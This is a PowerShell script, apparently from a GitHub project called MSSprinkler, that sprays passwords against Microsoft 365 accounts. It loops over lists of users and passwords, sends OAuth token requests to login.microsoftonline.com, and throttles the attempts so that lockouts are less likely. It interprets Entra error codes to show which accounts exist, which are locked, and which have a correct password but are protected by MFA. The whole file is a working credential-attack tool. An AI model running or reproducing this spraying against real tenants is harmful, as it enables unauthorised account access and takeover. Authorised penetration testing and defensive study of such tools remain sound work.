function Invoke-MSSprinkler{
    <#
    .Synopsis
        MSSprinkler is a password spraying utility that targets M365 accounts. It employs a 'low-and-slow' approach to avoid locking out accounts, and provides verbose information related to accounts / tenant information.

    .Description
        Version: 0.1
        Author: Connor Jackson
        GitHub: https://github.com/theresafewconors/mssprinkler

    .Parameter user
        A list of users to spray. One per line without commas. eg. user@tenant.com. Provide the path to the file.
    .Parameter pass
        A list of passwords to use. One per line without commas. Provide the path to the file.
    .Parameter threshold
        The threshold for the maximum number of attempts to make per min. Default is 8 if no value is provided.
    .Parameter URL
        URL to target. This will default to 'https://login.microsoftonline.com' if no value is provided.

    .Example
        Invoke-MSSprinkler -user .\users.txt -pass .\passwords.txt -threshold 12
        Invoke-MSSprinkler -us .\users.txt -p .\passwords.txt -t 12
    #>

Param(
    [string]$user,
    [string]$pass,
    [int]$threshold = 8,
    [string]$url = 'https://login.microsoftonline.com'
    )

# Create a list of usernames
$usernames = Get-Content $user
$passwords = Get-Content $pass
$total = $usernames.count * $passwords.count
$exptime = $total / $threshold

Write-Host "Expected time to complete is" $exptime "mins"

<#
ToDo:
    - Verbose MFA info
        - MS: DONE
        - Duo: Done
        - Google Auth: To do 
    - CSV Output
#>

Write-Host -ForegroundColor "yellow" "[*] The url to attack is" $url
Write-Host -ForegroundColor "red" "[*] " $usernames.count "user(s) detected"
Write-Host -ForegroundColor "red" "[*] " $passwords.count "password(s) detected"
Write-Host -ForegroundColor "cyan" "[*] operating at" $threshold "spraying attempts per min"
Write-Host -ForegroundColor "red" "[*] Starting Spray..."

$ErrorActionPreference= 'silentlycontinue'
for ($counter=0; $counter -lt $usernames.length; $counter++) {
    $un = $usernames[$counter]
    ForEach ($passes in $passwords){
        # Web Request Info
        $BodyParams = @{'client_id' = '5aa316d3-d05a-485f-a849-e05182f87d1d' ; 'client_info' = '1' ; 'grant_type' = 'password' ; username = $usernames[$counter] ; 'password' = $passes ; 'scope' = 'openid'}
        $postHeaders =  @{'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'}
        $wr = Invoke-WebRequest -Uri $url/organizations/oauth2/v2.0/token -Method Post -Headers $postHeaders -Body $BodyParams -ErrorVariable responseCode

        If ($wr.StatusCode -eq "200"){
            Write-Host -ForegroundColor "green" "[*] SUCCESS! $un : $passes"
            $wr = ""
            Start-Sleep(60/$threshold)
            break
        }
        else{
            # Incorrect username or password
            if ($responseCode -match "AADSTS50126")
            {
                Write-Host "    The password for $un appears to be incorrect."
            }
            # Account Locked
            ElseIf($responseCode -match "AADSTS50053")
            {
                Write-Host -ForegroundColor "red" "    WARNING! $un appears to be locked, skipping further attempts"
                break
            }
            # Invalid Username
            ElseIf($responseCode -match "AADSTS50034")
            {
                Write-Host -ForegroundColor "yellow" "    $un doesn't exist, skipping further attempts.."
                break
            }
            # Invalid Tenant
            ElseIf($responseCode -match "AADSTS50059")
            {
                Write-Host "    Supplied tenant for $un doesn't exist, skipping further attempts.."
                break
            }
            # MFA
            ElseIf($responseCode -match "AADSTS50076")
            {
                Write-Host -ForegroundColor "Cyan" "[*] Password for $un is correct but user has MFA enabled (DUO or MS)"
                break
            }
        }
        Start-Sleep(60/$threshold)
    }
}

# HTTP Status Code Response Values
# https://learn.microsoft.com/en-us/graph/errors
# todo

# Hashtable lookup of error responses with what it means
# Reference: https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
$errorResonseValues = @{
    AADSTS50029 = "Invalid URI provided"
    AADSTS50034 = "User account not found (invalid username)"
    AADSTS50059 = "Tenant not found"
    AADSTS50126 = "Invalid username or password" # standard failed password?
    AADSTS50128 = "Invalid domain name / Tenant does not exist"
    # MFA Responses
    AADSTS50076 = "MFA detected for user (DUO & Microsoft)"
    AADSTS50158 = "MFA detected for user (External Application)"
    }
}
